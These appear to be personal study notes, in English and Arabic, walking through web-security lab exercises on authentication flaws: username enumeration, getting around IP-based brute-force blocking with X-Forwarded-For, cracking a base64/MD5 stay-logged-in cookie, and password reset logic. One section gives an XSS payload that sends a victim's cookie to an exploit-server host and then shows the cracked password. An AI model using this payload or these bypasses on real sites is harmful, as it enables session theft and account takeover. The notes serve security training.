# Authentication vulnerabilities




<details>
  <summary>Lab: Password reset poisoning via middleware</summary>


1. login with ``wiener:peter``
2. signout
3. login with ``carlos``
4. click forget passowrd

  
</details>



































--------
```
✅ 1. Username enumeration via different responses
الثغرة: اختلاف الرسائل لما يكون اليوزر موجود أو غير موجود.

الاستغلال: جرّب يوزرات مختلفة وشوف الرسالة، تقدر تعرف لو اليوزر موجود.
```


--------

```
✅ 4.Username enumeration via subtly different responses
الثغرة: التطبيق بيرجع رسائل خطأ مختلفة بشكل طفيف جدًا حسب إذا كان اليوزر موجود أو مش موجود.
مثلًا:

Invalid username or password. ← لو اليوزر مش موجود.

Invalid password or password ← لو اليوزر موجود.

الرسالة شكلها شبه بعض لكن فيها فرق بسيط جدًا، والمهاجم ممكن يلاحظه.
```

--------

```
✅ 5. Username enumeration via response timing
الثغرة: الاختلاف في زمن الاستجابة لما يكون اليوزر موجود.

الاستغلال: لو زمن الاستجابة أطول مع يوزر معين → غالبًا موجود (لأن الباسورد بيتشيك بعده).


```

--------

```
✅ 6. Broken brute-force protection, IP block
الثغرة: حماية تسجيل الدخول بتمنع المحاولات المتكررة فقط من نفس الـ IP.

الاستغلال: استخدم X-Forwarded-For لتغيير عنوان الـ IP مع كل محاولة، وتجاوز الحماية.
```

---------

### 🎱``8 Lab: Brute-forcing a stay-logged-in cookie``

- > first login with ``wiener:peter`` with stay logged in option and inturcept the request
  >
  > ``found``
  >
  > ```
  > Cookie: session=X2AecSWQYF3pEDwqbjSuG6FYLHSV6IGq; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
  > ```
  >
  > as you see ``stay-logged-in`` is decoded in **``base64``** when decode it found:
  >
  > ```
  > wiener:51dc30ddc473d43a6011e9ebba6ca770
  > ```
  >
  > ``structure of cookies``
  >
  > ```
  > base64(username:MD5(password))
  > ```
  >
  > ohh so this cookie have username and passowrd hashed in ``MD5`` after decrypt it found the password **``peter``**
  >
  > **``order is important``**
  >
  > ![image](https://github.com/user-attachments/assets/d8ed9b02-4be1-4c3d-b40b-d4e1d4d1b8d9)
  >
  > 
  > 




----

### 9 offline password cracking 

- > first login with my username and passowrd ``wiener:peter`` with stay login button 
  >
  > found in cookie that is encoded in base64
  >
  > ``base64(username:md5(password))``
  >
  > now we know that comments is vuln to xss you will steal cookie of ``carlos`` by using xss
  >
  > in comment put
  >
  > ```
  > <script>document.location='https://exploit-0a1f000d0421311d80d80c4801090020.exploit-server.net/exploit'+document.cookie</script>
  > ```
  >
  > after that go to exploit server then logs you will find cookies of carlos
  >
  > ``Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz``
  >
  > ``carlos:26323c16d5f4dabff3bb136f2460a943``
  >
  > ``carlos:onceuponatime``



----- 

### Password reset broken logic


- > click reset password and check email box you will found link click on it if you try to remove token error will apper
  >
  > write new password and intercept the request now you can remove token and change user to carlos 
















































